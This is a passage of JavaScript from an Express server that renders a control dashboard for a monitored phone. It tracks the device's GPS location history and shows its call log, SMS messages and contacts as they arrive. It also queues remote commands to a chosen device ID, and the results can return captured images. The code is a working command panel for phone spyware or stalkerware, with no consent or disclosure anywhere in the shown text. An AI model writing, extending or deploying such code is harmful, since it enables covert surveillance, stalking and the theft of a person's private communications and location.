$('fitBtn').addEventListener('click', () => { const b=trailLine.getBounds(); if(b.isValid()) map.fitBounds(b,{padding:[30,30],maxZoom:16}); else if(latest) map.setView([latest.latitude,latest.longitude],16); });
$('centerBtn').addEventListener('click', () => { if(latest){ map.setView([latest.latitude,latest.longitude],16); if(marker) marker.openPopup(); } });
$('applyHistory').addEventListener('click', loadHistory);
$('liveBtn').addEventListener('click', returnToLive);
$('matchBtn').addEventListener('click', matchRoads);
async function searchPlace() {
  const q = $('place').value.trim(); if (!q) return;
  $('searchStatus').textContent = 'Searching...';
  try {
    const r = await fetch('https://nominatim.openstreetmap.org/search?format=jsonv2&limit=1&q='+encodeURIComponent(q));
    const results = await r.json();
    if (!results.length) { $('searchStatus').textContent = 'Not found.'; return; }
    const place = results[0]; const lat=Number(place.lat), lng=Number(place.lon);
    if (searchMarker) map.removeLayer(searchMarker);
    searchMarker = L.marker([lat,lng]).addTo(map).bindPopup(escHtml(place.display_name)).openPopup();
    map.setView([lat,lng],14); $('searchStatus').textContent = place.display_name;
  } catch { $('searchStatus').textContent = 'Search failed.'; }
}
$('searchBtn').addEventListener('click', searchPlace);
$('place').addEventListener('keydown', e => { if(e.key==='Enter') searchPlace(); });

// ── MONITOR ──────────────────────────────────────────────────────────
async function loadMonitorData() {
  try {
    const r = await fetch('/monitor-data');
    const data = await r.json();
    if (data.calls?.length) renderCalls(data.calls);
    if (data.sms?.length) renderSms(data.sms);
    if (data.contacts?.length) renderContacts(data.contacts);
  } catch(e) { console.error('Monitor load failed:', e); }
}
socket.on('monitorUpdate', payload => {
  if (payload.type === 'calls') renderCalls(payload.data);
  if (payload.type === 'sms') renderSms(payload.data);
  if (payload.type === 'contacts') renderContacts(payload.data);
});
function renderCalls(calls) {
  const types = ['', 'Incoming', 'Outgoing', 'Missed'];
  $('callPanel').innerHTML = calls.slice(0,20).map(c =>
    '<div style="padding:8px 0;border-bottom:1px solid var(--border)">'+
    '<span style="color:#edf4ff">'+escHtml(c.number)+'</span>'+
    '<span style="color:var(--muted);margin-left:12px">'+(types[c.type]||'Unknown')+'</span>'+
    '<span style="color:var(--muted);margin-left:12px">'+c.duration+'s</span>'+
    '<span style="color:var(--muted);margin-left:12px;font-size:11px">'+new Date(c.date).toLocaleString()+'</span></div>'
  ).join('') || 'No calls.';
}
function renderSms(smsList) {
  $('smsPanel').innerHTML = smsList.slice(0,20).map(s =>
    '<div style="padding:8px 0;border-bottom:1px solid var(--border)">'+
    '<b style="color:#edf4ff">'+escHtml(s.address)+'</b>'+
    '<span style="color:var(--muted);margin-left:8px;font-size:11px">'+new Date(s.date).toLocaleString()+'</span>'+
    '<div style="color:var(--muted);font-size:12px;margin-top:4px">'+escHtml((s.body||'').substring(0,80))+'</div></div>'
  ).join('') || 'No SMS.';
}
function renderContacts(contacts) {
  // FIX #1: count updated here via JavaScript, not server-side template
  $('contactCount').textContent = contacts.length;
  $('contactPanel').innerHTML = contacts.slice(0,50).map(c =>
    '<span style="display:inline-block;background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:5px 10px;margin:3px;font-size:12px">'+
    escHtml(c.name)+' · '+escHtml(c.number)+'</span>'
  ).join('') || 'No contacts.';
}

// ── COMMANDS ─────────────────────────────────────────────────────────
let cmdLog = [];
async function sendCommand(action) {
  const deviceId = $('deviceIdInput').value.trim() || 'default';
  $('cmdResult').textContent = 'Sending: ' + action + ' to ' + deviceId + '...';
  $('cmdImage').style.display = 'none';
  try {
    const r = await fetch('/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, deviceId })
    });
    const data = await r.json();
    $('cmdResult').textContent = 'Sent. ID: ' + data.command?.id + '\\nWaiting for device response...';
    cmdLog.unshift({ time: new Date().toLocaleTimeString(), action, result: 'Queued' });
    renderCmdHistory();
  } catch(e) { $('cmdResult').textContent = 'Failed: ' + e.message; }
}
socket.on('commandResult', result => {
  $('cmdResult').textContent = 'Command: ' + result.commandId + '\\nResult: ' + result.result + (result.data ? '\\nData: ' + JSON.stringify(result.data, null, 2) : '');
  if (result.data?.imageBase64) { $('cmdImage').src = 'data:image/jpeg;base64,' + result.data.imageBase64; $('cmdImage').style.display = 'block'; }
  cmdLog.unshift({ time: new Date().toLocaleTimeString(), action: result.commandId?.split('_')[0]||'cmd', result: result.result });
  renderCmdHistory();
});
function renderCmdHistory() {
  $('cmdHistory').innerHTML = cmdLog.slice(0,15).map(c =>
    '<tr><td>'+c.time+'</td><td>'+escHtml(c.action)+'</td><td class="green">'+escHtml(c.result)+'</td></tr>'
  ).join('') || '<tr><td colspan="3">No commands yet</td></tr>';
}

// ── INITIAL LOAD ─────────────────────────────────────────────────────
(async () => {
  try {
    const r = await fetch('/history?limit=2000');
    if (r.ok) {
      const data = await r.json();
      if (Array.isArray(data)) {
        allPoints = data.filter(validPoint).map(p => ({...p, latitude: Number(p.latitude), longitude: Number(p.longitude)}));
        drawTrail(allPoints);
        if (allPoints.length) {
          latest = allPoints[allPoints.length-1];
          updateMetrics(latest); updateMarker(latest);
          map.setView([latest.latitude, latest.longitude], 15);
        }
      }
    }
  } catch { $('mapStatus').textContent = 'History load failed. Waiting for live GPS.'; }
})();
</script>
</body>
</html>`);
});

app.get('/', (req, res) => { res.redirect('/dashboard'); });
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err.message);
    if (res.headersSent) return next(err);
    res.status(500).json({ message: 'Internal server error.' });
});

server.listen(PORT, '0.0.0.0', () => { console.log('Server running on port ' + PORT); });

async function shutdown() {
    server.close(async () => {
        try { if (pool) await pool.end(); } catch {}
        process.exit(0);
    });
    setTimeout(() => process.exit(1), 10000).unref();
}
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);
